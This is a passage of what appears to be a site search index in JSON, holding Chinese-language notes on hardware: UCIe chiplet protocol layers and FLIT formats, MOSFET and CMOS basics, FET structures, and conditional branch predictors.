\u200b\u8fde\u63a5\u8d77\u6765\u200b\u3002\u200b\u5b83\u200b\u652f\u6301\u200b\u4e0d\u540c\u200b\u7684\u200b\u534f\u8bae\u200b\uff1a\u200b\u6807\u51c6\u200b\u7684\u200b PCIe \u200b\u548c\u200b CXL\uff0c\u200b\u901a\u7528\u200b\u7684\u200b Streaming \u200b\u534f\u8bae\u200b\uff0c\u200b\u6216\u8005\u200b\u81ea\u5b9a\u4e49\u200b\u7684\u200b\u534f\u8bae\u200b\u3002</p> <p>\u200b\u5b83\u200b\u7684\u200b\u4e3b\u8981\u200b\u76ee\u7684\u200b\u662f\u200b\uff0c\u200b\u91c7\u7528\u200b\u4e00\u4e2a\u200b\u6807\u51c6\u200b\u7684\u200b\u7269\u7406\u5c42\u200b\u548c\u200b\u94fe\u8def\u5c42\u200b\uff0c\u200b\u628a\u200b die \u200b\u95f4\u200b\u7684\u200b\u901a\u4fe1\u534f\u8bae\u200b\u201c\u200b\u6807\u51c6\u5316\u200b\u201d\uff0c\u200b\u4f46\u662f\u200b\u5728\u200b UCIe \u200b\u4e0a\u5c42\u200b\uff0c\u200b\u5177\u4f53\u200b\u7528\u200b\u4ec0\u4e48\u200b\u534f\u8bae\u200b\uff0c\u200b\u5c31\u200b\u4e0d\u200b\u4e00\u5b9a\u200b\u90a3\u4e48\u200b\u6807\u51c6\u200b\u4e86\u200b\u3002</p> <p>UCIe \u200b\u4ece\u200b\u9ad8\u5230\u200b\u4f4e\u200b\u5206\u4e3a\u200b\u4e09\u5c42\u200b\uff1a</p> <ol> <li>\u200b\u4e0a\u5c42\u200b\u7684\u200b Protocol Layer\uff1a\u200b\u652f\u6301\u200b PCIe\uff0cCXL\uff0c\u200b\u6216\u8005\u200b\u901a\u7528\u200b\u7684\u200b Streaming \u200b\u534f\u8bae\u200b</li> <li>\u200b\u4e2d\u95f4\u200b\u7684\u200b Die-to-Die Adapter</li> <li>\u200b\u5e95\u5c42\u200b\u7684\u200b Physical Layer</li> </ol>"},{"location":"hardware/chiplet.html#protocol-layer-die-to-die-adapter","title":"Protocol Layer &amp; Die-to-Die Adapter","text":"<p>Protocol Layer \u200b\u652f\u6301\u200b PCIe\u3001CXL \u200b\u6216\u8005\u200b\u901a\u7528\u200b\u7684\u200b Streaming \u200b\u534f\u8bae\u200b\u3002</p> <p>PCIe \u200b\u4ece\u200b 6.0 \u200b\u5f00\u59cb\u200b\uff0c\u200b\u5f15\u5165\u200b\u4e86\u200b 256B \u200b\u7684\u200b FLIT\uff0c\u200b\u56e0\u6b64\u200b\u5982\u679c\u200b\u8981\u200b\u5728\u200b UCIe \u200b\u4e0a\u200b\u8dd1\u200b PCIe 6.0\uff0c\u200b\u90a3\u200b\u5c31\u200b\u628a\u200b PCIe 6.0 \u200b\u7684\u200b FLIT \u200b\u4f5c\u4e3a\u200b UCIe \u200b\u7684\u200b Protocol Layer\u3002</p> <p>\u200b\u7c7b\u4f3c\u200b\u5730\u200b\uff0cCXL \u200b\u652f\u6301\u200b 68B \u200b\u548c\u200b 256B \u200b\u4e24\u79cd\u200b\u5927\u5c0f\u200b\u7684\u200b FLIT\uff0cUCIe \u200b\u4e5f\u200b\u628a\u200b CXL \u200b\u7684\u200b\u4e24\u79cd\u200b FLIT \u200b\u5927\u5c0f\u200b\u5f15\u5165\u200b\u4e86\u200b\u8fdb\u6765\u200b\uff0c\u200b\u4f5c\u4e3a\u200b Protocol Layer\u3002</p> <p>\u200b\u5bf9\u4e8e\u200b Streaming \u200b\u534f\u8bae\u200b\uff0c\u200b\u5b83\u200b\u53ef\u4ee5\u200b\u501f\u7528\u200b PCIe \u200b\u6216\u8005\u200b CXL \u200b\u7684\u200b FLIT \u200b\u683c\u5f0f\u200b\u6765\u200b\u4f20\u8f93\u200b\u3002</p> <p>\u200b\u65e0\u8bba\u200b\u54ea\u200b\u79cd\u200b\u683c\u5f0f\u200b\uff0c\u200b\u6700\u540e\u200b\u5230\u200b\u7269\u7406\u5c42\u200b\u90fd\u200b\u662f\u200b\u4ee5\u200b 64B \u200b\u4e3a\u200b\u4e00\u7ec4\u200b\u7684\u200b\u5f62\u5f0f\u200b\u53d1\u9001\u200b\u51fa\u53bb\u200b\u3002</p> <p>\u200b\u7efc\u5408\u200b\u4ee5\u4e0a\u200b\u9700\u6c42\u200b\uff0cUCIe \u200b\u4e00\u5171\u200b\u652f\u6301\u200b\u5982\u4e0b\u200b\u7684\u200b\u683c\u5f0f\u200b\uff1a</p> <ol> <li>Format 1: Raw <code>Protocol Layer populates all the bytes on FDI. Adapter passes to RDI without modifications or additions.</code> \u200b\u5bf9\u200b\u6570\u636e\u200b\u4e0d\u200b\u505a\u200b\u4efb\u4f55\u200b\u5904\u7406\u200b\uff0c\u200b\u76f4\u63a5\u200b\u4f20\u7ed9\u200b\u7269\u7406\u5c42\u200b</li> <li>Format 2: 68B Flit <code>Protocol Layer transmits 64B per Flit on FDI. Adapter inserts two bytes of Flit header and two bytes of CRC and performs the required barrel shifting of bytes before transmitting on RDI. On the RX, Adapter strips out the Flit header and CRC only sending the 64B per Flit to the Protocol Layer on FDI.</code> \u200b\u5728\u200b 64B \u200b\u7684\u200b Flit \u200b\u524d\u9762\u200b\u63d2\u5165\u200b\u4e24\u4e2a\u200b\u5b57\u8282\u200b\u7684\u200b\u5934\u90e8\u200b\uff0c\u200b\u5728\u200b\u540e\u9762\u200b\u63d2\u5165\u200b\u4e24\u4e2a\u200b\u5b57\u8282\u200b\u7684\u200b CRC\uff0c\u200b\u4ee5\u200b 68B \u200b\u4e3a\u200b\u5355\u4f4d\u200b\uff0c\u200b\u8fde\u7eed\u200b\u5730\u200b\u653e\u5728\u200b\u591a\u4e2a\u200b 64B \u200b\u4e2d\u200b\u53d1\u9001\u200b\u51fa\u53bb\u200b</li> <li>Format 3: Standard 256B End Header Flit <code>Protocol Layer transmits 256B of Flit on FDI, while driving 0b on the bits reserved for the Adapter. Adapter fills in the relevant Flit header and CRC information before transmitting on RDI. On the Rx, Adapter forwards the Flit received from the Link to the Protocol Layer without modifying any bits applicable to the Protocol Layer, and the Protocol Layer must ignore any bits not applicable for it. Flit Header is located on Byte 236 and Byte 237 of the Flit.</code> \u200b\u5728\u200b Flit \u200b\u5c3e\u90e8\u200b\u63d2\u5165\u200b\u5934\u90e8\u200b\u7b49\u200b\u4fe1\u606f\u200b</li> <li>Format 4: Standard 256B Start Header Flit <code>Protocol Layer transmits 256B of Flit on FDI, while driving 0b on the bits reserved for the Adapter. Adapter fills in the relevant Flit header and CRC information before transmitting on RDI. On the Rx, Adapter forwards the Flit received from the Link to the Protocol Layer without modifying any bits applicable to the Protocol Layer, and the Protocol Layer must ignore any bits not applicable for it. Flit Header is located on Byte 0 and Byte 1 of the Flit.</code> \u200b\u5728\u200b Flit \u200b\u5934\u90e8\u200b\u63d2\u5165\u200b\u4e24\u200b\u5b57\u8282\u200b\u7684\u200b\u5934\u90e8\u200b\uff0c\u200b\u5728\u200b\u5c3e\u90e8\u200b\u63d2\u5165\u200b\u5176\u4f59\u200b\u4fe1\u606f\u200b</li> <li>Format 5: Latency-Optimized 256B without Optional Bytes Flit <code>Protocol Layer transmits 256B of Flit on FDI, while driving 0b on the bits reserved for the Adapter. Adapter fills in the relevant Flit header and CRC information before transmitting on RDI. On the Rx, Adapter forwards the Flit received from the Link to the Protocol Layer without modifying any bits applicable to the Protocol Layer, and the Protocol Layer must ignore any bits not applicable for it. CRC bytes sent with each 128B of the Flit. The optional Protocol Layer bytes are reserved in this format and not used by the Protocol Layer.</code> \u200b\u5728\u200b\u6570\u636e\u200b\u7684\u200b\u4e2d\u95f4\u200b\u548c\u200b\u5c3e\u90e8\u200b\u90fd\u200b\u63d2\u5165\u200b\u8f83\u200b\u77ed\u200b\u7684\u200b CRC\uff0c\u200b\u4ece\u800c\u200b\u5b9e\u73b0\u200b\u66f4\u200b\u77ed\u200b\u7684\u200b\u5ef6\u8fdf\u200b</li> <li>Format 6: Latency-Optimized 256B with Optional Bytes Flit <code>Protocol Layer transmits 256B of Flit on FDI, while driving 0b on the bits reserved for the Adapter. Adapter fills in the relevant Flit header and CRC information before transmitting on RDI. On the Rx, Adapter forwards the Flit received from the Link to the Protocol Layer without modifying any bits applicable to the Protocol Layer, and the Protocol Layer must ignore any bits not applicable for it. CRC bytes sent with each 128B of the Flit, and optional bytes are used by the Protocol Layer.</code></li> </ol> <p>\u200b\u4e0a\u6587\u200b\u7684\u200b FDI \u200b\u610f\u601d\u200b\u662f\u200b Flit-aware D2D Interface\uff0c\u200b\u662f\u200b Protocol Layer \u200b\u548c\u200b D2D Adapter \u200b\u4e4b\u95f4\u200b\u7684\u200b\u63a5\u53e3\u200b\uff1bRDi \u200b\u7684\u200b\u610f\u601d\u200b\u662f\u200b Raw D2D Interface\uff0c\u200b\u662f\u200b D2D Adapter \u200b\u548c\u200b Physical Layer \u200b\u4e4b\u95f4\u200b\u7684\u200b\u63a5\u53e3\u200b\u3002</p>"},{"location":"hardware/chiplet.html#physical-layer","title":"Physical Layer","text":"<p>\u200b\u7269\u7406\u5c42\u200b\u62ff\u5230\u200b\u7684\u200b\u5c31\u662f\u200b\u4e00\u7cfb\u5217\u200b\u7684\u200b 64B \u200b\u6570\u636e\u200b\uff0c\u200b\u6839\u636e\u200b\u94fe\u8def\u200b\u7684\u200b\u5bbd\u5ea6\u200b\uff0c\u200b\u5206\u5e03\u200b\u5230\u200b\u4e0d\u540c\u200b\u7684\u200b Lane \u200b\u4e0a\u200b\u3002</p>"},{"location":"hardware/chiplet.html#aib-advanced-interface-bus","title":"AIB (Advanced Interface Bus)","text":"<p>Specification: https://github.com/chipsalliance/AIB-specification</p> <p>Whitepaper: https://www.intel.com/content/dam/www/public/us/en/documents/white-papers/accelerating-innovation-through-aib-whitepaper.pdf</p> <p>RTL Example: https://github.com/chipsalliance/aib-protocols https://github.com/chipsalliance/aib-phy-hardware</p>"},{"location":"hardware/cmos.html","title":"CMOS (Complementary Metal Oxide Semiconductor)","text":""},{"location":"hardware/cmos.html#mosfet","title":"MOSFET","text":"<p>MOSFET \u200b\u6709\u200b\u4e24\u79cd\u200b\uff1aNMOS \u200b\u548c\u200b PMOS\uff0c\u200b\u7535\u8def\u200b\u7b26\u53f7\u200b\u5982\u4e0b\u200b\uff1a</p> <p> </p> PMOS \u200b\u548c\u200b NMOS \u200b\u7684\u200b\u7535\u8def\u200b\u7b26\u53f7\u200b\uff08\u200b\u56fe\u6e90\u200b Wikipedia\uff09 <p>PMOS \u200b\u548c\u200b NMOS \u200b\u90fd\u200b\u6709\u200b\u4e09\u4e2a\u200b\u7535\u6781\u200b\uff0c\u200b\u5206\u522b\u200b\u662f\u200b\u6e90\u7ea7\u200b\uff08Source\uff09\uff0c\u200b\u6805\u7ea7\u200b\uff08Gate\uff09\u200b\u548c\u200b\u6f0f\u7ea7\u200b\uff08Drain\uff09\u3002MOSFET \u200b\u7684\u200b\u7279\u70b9\u200b\u662f\u200b\uff0c\u200b\u5728\u200b \\(D\\) \u200b\u5230\u200b \\(S\\) \u200b\u7684\u200b\u7535\u6d41\u200b\u53d7\u5230\u200b \\(G\\) \u200b\u4e5f\u200b\u5c31\u662f\u200b\u6805\u7ea7\u200b\u7684\u200b\u7535\u538b\u200b\u7684\u200b\u63a7\u5236\u200b\uff1a</p> <ol> <li>\u200b\u5f53\u200b \\(V_{GS} &lt; V_{th}\\) \u200b\u65f6\u200b\uff0c\\(I_D=0\\)\uff0c\u200b\u6b64\u65f6\u200b MOSFET \u200b\u5904\u4e8e\u200b\u65ad\u5f00\u200b\u7684\u200b\u72b6\u6001\u200b</li> <li>\u200b\u5f53\u200b \\(V_{GS} &gt; V_{th}, V_{GD} &gt; V_{th}\\) \u200b\u65f6\u200b\uff0c\\(I_D=\\frac{1}{2}\\mu_nC_{ox}\\frac{W}{L}(2(V_{GS}-V_{th})V_{DS}-V_{DS}^2)\\)\uff0c\u200b\u6b64\u65f6\u200b MOSFET \u200b\u5904\u4e8e\u200b\u7ebf\u6027\u200b\u533a\u200b</li> <li>\u200b\u5f53\u200b \\(V_{GS} &gt; V_{th}, V_{GD} &lt; V_{th}\\) \u200b\u65f6\u200b\uff0c\\(I_D=\\frac{1}{2}\\mu_nC_{ox}\\frac{W}{L}(V_{GS}-V_{th})^2[1+\\lambda(V_{DS}-V_{DSsat})]\\)\uff0c\u200b\u6b64\u65f6\u200b MOSFET \u200b\u5904\u4e8e\u200b\u9971\u548c\u200b\u533a\u200b</li> </ol> <p>\u200b\u8fd9\u91cc\u200b\u7684\u200b\u7ebf\u6027\u200b\u533a\u200b\u548c\u200b\u9971\u548c\u200b\u533a\u200b\u662f\u200b\u5728\u200b \\(I_D - V_{DS}\\) \u200b\u7279\u6027\u200b\u66f2\u7ebf\u200b\u4e0a\u200b\u8bf4\u200b\u7684\u200b\uff08\u200b\u89c1\u200b\u4e0b\u56fe\u200b\uff09\uff0c\u200b\u610f\u601d\u200b\u662f\u200b\u5f53\u200b \\(V_{GS} &gt; V_{th}\\) \u200b\u7684\u200b\u65f6\u5019\u200b\uff0c\u200b\u968f\u7740\u200b \\(V_{DS}\\) \u200b\u7684\u200b\u589e\u5927\u200b\uff0c\\(I_D\\) \u200b\u9996\u5148\u200b\u4f1a\u200b\u589e\u5927\u200b\uff0c\u200b\u76f4\u5230\u200b \\(V_{GD} &gt; V_{th}\\) \u200b\u7684\u200b\u65f6\u5019\u200b\uff0c\\(I_D\\) \u200b\u9971\u548c\u200b\uff0c\u200b\u51e0\u4e4e\u200b\u4e0d\u518d\u200b\u589e\u52a0\u200b\u3002\u200b\u4e25\u683c\u200b\u6765\u8bb2\u200b\uff0c\u200b\u6240\u8c13\u200b\u7684\u200b\u7ebf\u6027\u200b\u533a\u200b\uff0c\u200b\u5b9e\u9645\u4e0a\u200b\u4e5f\u200b\u4e0d\u662f\u200b\u76f4\u7ebf\u200b\uff0c\u200b\u800c\u662f\u200b\u629b\u7269\u7ebf\u200b\u3002</p> <p> </p>  I<sub>D</sub> - V<sub>DS</sub> \u200b\u7279\u5f81\u200b\u66f2\u7ebf\u200b\uff08\u200b\u56fe\u6e90\u200b\u6e05\u534e\u5927\u5b66\u200b\u5f20\u96f7\u200b\u8001\u5e08\u200b\u7535\u5b50\u5b66\u200b\u57fa\u7840\u200b\u8bfe\u7a0b\u200b\u7684\u200b\u8bfe\u4ef6\u200b\uff09 <p>PMOS \u200b\u548c\u200b NMOS \u200b\u7684\u200b\u533a\u522b\u200b\u662f\u200b\u7535\u6d41\u200b\u7684\u200b\u65b9\u5411\u4e0d\u540c\u200b\u3002PMOS \u200b\u7535\u6d41\u200b\u4ece\u200b S \u200b\u6d41\u5411\u200b D\uff0cNMOS \u200b\u7535\u6d41\u200b\u4ece\u200b D \u200b\u548c\u200b S\u3002\u200b\u5982\u679c\u200b\u6ce8\u610f\u200b\u5230\u200b\u4e0a\u9762\u200b MOSFET \u200b\u7684\u200b\u7b26\u53f7\u200b\u7684\u200b\u753b\u6cd5\u200b\uff0c\u200b\u4f1a\u200b\u53d1\u73b0\u200b\u7535\u6d41\u200b\u90fd\u200b\u662f\u4ece\u200b\u4e0a\u9762\u200b\u5f80\u4e0b\u6d41\u200b\u3002\u200b\u6b64\u5916\u200b\u8fd8\u6709\u200b\u4e00\u4e2a\u200b\u89c4\u5f8b\u200b\uff0c\u200b\u7bad\u5934\u200b\u8fde\u63a5\u200b\u7684\u200b\u90a3\u200b\u4e00\u4fa7\u200b\u5c31\u662f\u200b S\u3002</p>"},{"location":"hardware/cmos.html#cmos","title":"\u6570\u5b57\u7535\u8def\u200b\u4e2d\u200b\u7684\u200b CMOS","text":"<p>CMOS \u200b\u5168\u79f0\u200b\u662f\u200b Complementary metal\u2013oxide\u2013semiconductor\uff0c\u200b\u610f\u601d\u200b\u5c31\u662f\u200b\u62ff\u200b PMOS \u200b\u548c\u200b NMOS \u200b\u7684\u200b\u7ec4\u5408\u200b\u6765\u200b\u5b9e\u73b0\u200b\u7535\u8def\u200b\u3002\u200b\u5f53\u200b CMOS \u200b\u88ab\u200b\u7528\u6765\u200b\u5b9e\u73b0\u200b\u6570\u5b57\u7535\u8def\u200b\u7684\u200b\u65f6\u5019\u200b\uff0cPMOS \u200b\u548c\u200b NMOS \u200b\u7ecf\u5e38\u200b\u6210\u200b\u5bf9\u200b\u51fa\u73b0\u200b\uff0cPMOS \u200b\u63a5\u5230\u200b \\(V_{DD}\\)\uff0cNMOS \u200b\u63a5\u5230\u200b \\(GND\\) \u200b\u4e0a\u200b\u3002\u200b\u4f8b\u5982\u200b\u7528\u200b PMOS \u200b\u548c\u200b NMOS \u200b\u5b9e\u73b0\u200b\u4e00\u4e2a\u200b\u975e\u200b\u95e8\u200b\uff08NOT gate\uff09\uff1a</p> <p> </p>  CMOS \u200b\u5b9e\u73b0\u200b\u975e\u200b\u95e8\u200b\uff08\u200b\u56fe\u6e90\u200b CMOS Logic Gate - Geeks for Geeks\uff09 <p>\u200b\u5f53\u200b\u8f93\u5165\u200b\u4e3a\u200b\u9ad8\u7535\u5e73\u200b\u7684\u200b\u65f6\u5019\u200b\uff0cNMOS \u200b\u5bfc\u901a\u200b\uff0cPMOS \u200b\u65ad\u5f00\u200b\uff0c\u200b\u6b64\u65f6\u200b\u8f93\u51fa\u200b\u901a\u8fc7\u200b NMOS \u200b\u63a5\u5230\u200b\u4e86\u200b\u5730\u4e0a\u200b\uff0c\u200b\u6240\u4ee5\u200b\u8f93\u51fa\u200b\u4f4e\u7535\u5e73\u200b\u3002\u200b\u5f53\u200b\u8f93\u5165\u200b\u4e3a\u200b\u4f4e\u7535\u5e73\u200b\u7684\u200b\u65f6\u5019\u200b\uff0cPMOS \u200b\u5bfc\u901a\u200b\uff0cNMOS \u200b\u65ad\u5f00\u200b\uff0c\u200b\u6b64\u65f6\u200b\u8f93\u51fa\u200b\u901a\u8fc7\u200b PMOS \u200b\u63a5\u5230\u200b\u4e86\u200b\u7535\u6e90\u200b\u4e0a\u200b\uff0c\u200b\u6240\u4ee5\u200b\u8f93\u51fa\u200b\u9ad8\u7535\u5e73\u200b\u3002\u200b\u7528\u200b\u7c7b\u4f3c\u200b\u7684\u200b\u65b9\u6cd5\u200b\uff0c\u200b\u8fd8\u200b\u53ef\u4ee5\u200b\u8bbe\u8ba1\u200b\u51fa\u200b\u4e0e\u975e\u95e8\u200b\uff08NAND gate\uff09\u200b\u548c\u200b\u6216\u975e\u95e8\u200b\uff08NOR gate\uff09\uff1a</p> <p> </p>  CMOS \u200b\u5b9e\u73b0\u200b\u4e0e\u975e\u95e8\u200b\u548c\u200b\u6216\u975e\u95e8\u200b\uff08\u200b\u56fe\u6e90\u200b CMOS Logic Gate - Geeks for Geeks\uff09 <p>\u200b\u4ee5\u53ca\u200b\u5728\u200b\u5de5\u827a\u200b\u5e93\u91cc\u200b\u5e38\u89c1\u200b\u7684\u200b AOI\uff08And Or Invert\uff09\u200b\u548c\u200b OAI\uff08Or And Invert\uff09\u200b\u95e8\u200b\uff1a</p> <p> </p>  CMOS \u200b\u5b9e\u73b0\u200b AOI \u200b\u548c\u200b OAI \u200b\u95e8\u200b\uff08\u200b\u56fe\u6e90\u200b CMOS Logic Gate - Geeks for Geeks\uff09 <p>CMOS \u200b\u5728\u200b\u5b9e\u73b0\u200b\u6570\u5b57\u7535\u8def\u200b\u7684\u200b\u65f6\u5019\u200b\uff0c\u200b\u5e76\u200b\u6ca1\u6709\u200b\u7528\u5230\u200b\u5b83\u200b\u7684\u200b\u7ebf\u6027\u200b\u533a\u200b\u548c\u200b\u9971\u548c\u200b\u533a\u200b\u7684\u200b\u7279\u6027\u200b\uff0c\u200b\u53ea\u7528\u200b\u5230\u200b\u4e86\u200b \\(V_{GS}\\) \u200b\u548c\u200b \\(V_{th}\\) \u200b\u7684\u200b\u5927\u5c0f\u200b\u4ee5\u53ca\u200b\u662f\u5426\u200b\u6709\u200b\u7535\u6d41\u200b\u7684\u200b\u5173\u7cfb\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u8ba4\u4e3a\u200b PMOS \u200b\u548c\u200b NMOS \u200b\u5c31\u662f\u200b\u4e00\u4e2a\u200b\u7528\u200b\u7535\u538b\u200b\u63a7\u5236\u200b\u7684\u200b\u5f00\u5173\u200b\u3002</p>"},{"location":"hardware/cmos.html#planar-fet-finfet-gaafet-and-mbcfet","title":"Planar FET, FinFET, GAAFET and MBCFET","text":"<p>\u200b\u4e0b\u9762\u200b\u6765\u200b\u8ba8\u8bba\u4e00\u4e0b\u200b CMOS \u200b\u7535\u8def\u200b\u7684\u200b\u5de5\u827a\u200b\u3002\u200b\u524d\u9762\u200b\u8bb2\u200b\u5230\u200b\uff0cCMOS \u200b\u6709\u200b\u4e09\u4e2a\u200b\u6e90\u200b\uff08S\uff09\uff0c\u200b\u6805\u200b\uff08G\uff09\u200b\u548c\u200b\u6f0f\u200b\uff08D\uff09\uff0c\u200b\u5f53\u200b G \u200b\u65bd\u52a0\u200b\u8db3\u591f\u200b\u9ad8\u200b\u7684\u200b\u7535\u538b\u200b\u65f6\u200b\uff0cS \u200b\u548c\u200b D \u200b\u4e4b\u95f4\u200b\u53ef\u4ee5\u200b\u6709\u200b\u7535\u6d41\u200b\u901a\u8fc7\u200b\u3002\u200b\u4ece\u200b\u7269\u7406\u200b\u4e0a\u200b\uff0c\u200b\u8fd9\u200b\u4e09\u4e2a\u200b\u7535\u7ea7\u200b\u7684\u200b\u4f4d\u7f6e\u200b\u5c31\u200b\u51b3\u5b9a\u200b\u4e86\u200b\u5b83\u200b\u751f\u4ea7\u200b\u7684\u200b\u96be\u5ea6\u200b\u4ee5\u53ca\u200b\u80fd\u591f\u200b\u5b9e\u73b0\u200b\u7684\u200b\u6676\u4f53\u7ba1\u200b\u5bc6\u5ea6\u200b\uff1a</p> <p> </p>  \u200b\u4e0d\u540c\u200b\u7684\u200b FET \u200b\u7269\u7406\u200b\u6784\u9020\u200b 3D \u200b\u793a\u610f\u56fe\u200b\uff08\u200b\u56fe\u6e90\u200b Samsung\uff09 <p> </p>  \u200b\u4e0d\u540c\u200b\u7684\u200b FET \u200b\u7269\u7406\u200b\u6784\u9020\u200b 2D \u200b\u5207\u9762\u200b\u56fe\u200b\uff08\u200b\u56fe\u6e90\u200b On the Vertically Stacked Gate-All-Around Nanosheet and Nanowire Transistor Scaling beyond the 5 nm Technology Node\uff09 <ol> <li>Planar FET\uff1a\u200b\u524d\u540e\u200b\u662f\u200b S \u200b\u548c\u200b D\uff0c\u200b\u7136\u540e\u200b G \u200b\u76d6\u200b\u5728\u200b\u4e0a\u9762\u200b\uff0c\u200b\u5f53\u200b G \u200b\u65bd\u52a0\u200b\u7535\u538b\u200b\u65f6\u200b\uff0c\u200b\u5728\u200b G \u200b\u4e0b\u90e8\u200b\u3001S \u200b\u548c\u200b D \u200b\u4e4b\u95f4\u200b\u805a\u96c6\u200b\u7535\u5b50\u200b\uff0c\u200b\u5f62\u6210\u200b\u7535\u6d41\u200b\u3002</li> <li>FinFET\uff1a\u200b\u524d\u540e\u200b\u662f\u200b S \u200b\u548c\u200b D\uff0cG \u200b\u4ece\u200b\u4e0a\u65b9\u200b\u3001\u200b\u5de6\u4fa7\u200b\u548c\u200b\u53f3\u4fa7\u200b\u6765\u200b\u5939\u4f4f\u200b S \u200b\u548c\u200b D \u200b\u4e4b\u95f4\u200b\u7684\u200b\u901a\u9053\u200b\uff0c\u200b\u4e09\u9762\u200b\u73af\u7ed5\u200b\u3002</li> <li>GAAFET(Nanowire)/MBCFET(Nanosheet)\uff1a\u200b\u524d\u540e\u200b\u4e09\u6761\u200b\u662f\u200b S \u200b\u548c\u200b D\uff0cG \u200b\u4ece\u200b\u56db\u4e2a\u200b\u65b9\u5411\u200b\u5939\u4f4f\u200b\u4e09\u5bf9\u200b S \u200b\u548c\u200b D \u200b\u4e4b\u95f4\u200b\u7684\u200b\u901a\u9053\u200b\uff0c\u200b\u56db\u9762\u200b\u73af\u7ed5\u200b\u3002</li> </ol> <p>\u200b\u968f\u7740\u200b\u5236\u7a0b\u200b\u53d1\u5c55\u200b\uff0cG \u200b\u548c\u200b S-D \u200b\u4e4b\u95f4\u200b\u901a\u9053\u200b\u7684\u200b\u63a5\u89e6\u9762\u200b\u8d8a\u6765\u8d8a\u200b\u591a\u200b\uff0c\u200b\u5b9e\u73b0\u200b\u66f4\u200b\u9ad8\u200b\u7684\u200b\u6676\u4f53\u7ba1\u200b\u5bc6\u5ea6\u200b\uff0c\u200b\u751f\u4ea7\u5de5\u827a\u200b\u4e5f\u200b\u66f4\u52a0\u200b\u590d\u6742\u200b\u3002</p>"},{"location":"hardware/conditional_branch_predictor.html","title":"\u6761\u4ef6\u200b\u5206\u652f\u200b\u9884\u6d4b\u5668","text":"<p>\u200b\u6761\u4ef6\u200b\u5206\u652f\u200b\u9884\u6d4b\u5668\u200b\u8d1f\u8d23\u200b\u9884\u6d4b\u200b\u6761\u4ef6\u200b\u5206\u652f\u200b\u7684\u200b\u8df3\u8f6c\u200b\u65b9\u5411\u200b\uff1a\u200b\u8df3\u8f6c\u200b\uff08Taken\uff09\u200b\u6216\u8005\u200b\u4e0d\u200b\u8df3\u8f6c\u200b\uff08Not Taken\uff09\u3002</p>"},{"location":"hardware/conditional_branch_predictor.html#static-predictor","title":"Static predictor","text":"<p>\u200b\u53ea\u200b\u6839\u636e\u200b\u6307\u4ee4\u200b\u672c\u8eab\u200b\u7684\u200b\u7c7b\u578b\u200b\uff08\u200b\u6216\u8005\u200b hint\uff09\u200b\u8fdb\u884c\u200b\u5206\u652f\u200b\u9884\u6d4b\u200b\u3002</p>"},{"location":"hardware/conditional_branch_predictor.html#bimodal-predictor","title":"Bimodal predictor","text":"<p>\u200b\u5bf9\u200b\u5206\u652f\u200b\u5730\u5740\u200b\u6c42\u200b hash\uff0c\u200b\u5f97\u5230\u200b\u7684\u200b hash \u200b\u53d6\u6a21\u200b\u4f5c\u4e3a\u200b index \u200b\u53bb\u200b\u8bbf\u95ee\u200b\u4e00\u4e2a\u200b\u8868\u200b\uff0c\u200b\u8868\u200b\u7684\u200b\u6bcf\u4e00\u9879\u200b\u662f\u200b\u4e00\u4e2a\u200b 2-bit saturating counter\uff0c0 \u200b\u548c\u200b 1 \u200b\u9884\u6d4b\u200b not taken\uff0c2 \u200b\u548c\u200b 3 \u200b\u9884\u6d4b\u200b taken\u3002\u200b\u6267\u884c\u200b\u5b8c\u200b\u5206\u652f\u200b\u540e\u200b\uff0c\u200b\u5982\u679c\u200b taken\uff0c\u200b\u5219\u200b\u5bf9\u5e94\u200b counter \u200b\u52a0\u4e00\u200b\uff1b\u200b\u5426\u5219\u200b\u5bf9\u5e94\u200b counter \u200b\u51cf\u4e00\u200b\u3002</p>"},{"location":"hardware/conditional_branch_predictor.html#two-level-predictor","title":"Two level predictor","text":"<p>\u200b\u8bb0\u5f55\u200b\u6700\u8fd1\u200b\u82e5\u5e72\u4e2a\u200b\u5206\u652f\u200b\u7684\u200b\u8df3\u8f6c\u200b/\u200b\u4e0d\u200b\u8df3\u8f6c\u200b\u5386\u53f2\u200b\uff0c\u200b\u4fdd\u5b58\u200b\u5728\u200b Global History Register \u200b\u91cc\u9762\u200b\uff0c\u200b\u518d\u7528\u200b GHR \u200b\u4f5c\u4e3a\u200b index \u200b\u53bb\u200b\u8bbf\u95ee\u200b Pattern History Table\uff0cPHT \u200b\u7684\u200b\u6bcf\u4e00\u9879\u200b\u4e5f\u200b\u662f\u200b\u4e00\u4e2a\u200b 2 bit saturating counter\uff0c\u200b\u5269\u4e0b\u200b\u7684\u200b\u903b\u8f91\u200b\u548c\u200b Bimodal \u200b\u4e00\u6837\u200b\u3002\u200b\u6709\u65f6\u5019\u200b GHR \u200b\u4e5f\u200b\u88ab\u200b\u79f0\u4e3a\u200b Direction History Register(DHR)\u3002</p> <p>\u200b\u5982\u679c\u200b\u628a\u200b PC \u200b\u548c\u200b GHR \u200b\u5f02\u6216\u200b\u540e\u200b\u4f5c\u4e3a\u200b index \u200b\u8bbf\u95ee\u200b PHT\uff0c\u200b\u5c31\u662f\u200b Gshare \u200b\u7b97\u6cd5\u200b\u3002\u200b\u5982\u679c\u200b\u628a\u200b PC \u200b\u548c\u200b GHR \u200b\u62fc\u63a5\u200b\u8d77\u6765\u200b\u4f5c\u4e3a\u200b index \u200b\u8bbf\u95ee\u200b PHT\uff0c\u200b\u5c31\u662f\u200b Gselect \u200b\u7b97\u6cd5\u200b\u3002</p>"},{"location":"hardware/conditional_branch_predictor.html#local-history","title":"Local History","text":"<p>\u200b\u4e5f\u200b\u53ef\u4ee5\u200b\u8bb0\u5f55\u200b\u6bcf\u4e2a\u200b\u5206\u652f\u200b\u81ea\u5df1\u200b\u7684\u200b\u8df3\u8f6c\u200b/\u200b\u4e0d\u200b\u8df3\u8f6c\u200b\u5386\u53f2\u200b\uff0c\u200b\u4fdd\u5b58\u200b\u5728\u200b Branch History Table \u200b\u91cc\u9762\u200b\uff1a\u200b\u6839\u636e\u200b PC \u200b\u4ece\u200b Branch History Table \u200b\u91cc\u200b\u627e\u5230\u200b\u8be5\u200b\u5206\u652f\u200b\u7684\u200b Local History\uff0c\u200b\u518d\u7528\u200b Local History \u200b\u8bbf\u95ee\u200b PHT\u3002\u200b\u4e5f\u200b\u53ef\u4ee5\u200b\u628a\u200b Local History \u200b\u548c\u200b PC \u200b\u7ed3\u5408\u200b\u8d77\u6765\u200b\u4f5c\u4e3a\u200b index \u200b\u8bbf\u95ee\u200b PHT\u3002</p>"},{"location":"hardware/conditional_branch_predictor.html#path-history","title":"Path 